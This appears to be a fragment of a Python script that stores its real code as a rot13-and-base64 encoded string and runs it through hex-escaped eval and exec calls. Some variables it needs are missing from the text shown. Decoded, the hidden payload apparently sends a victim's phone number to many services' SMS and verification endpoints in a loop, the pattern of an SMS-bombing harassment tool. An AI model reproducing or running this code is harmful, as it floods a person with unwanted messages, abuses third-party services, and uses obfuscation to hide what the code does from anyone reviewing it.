destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))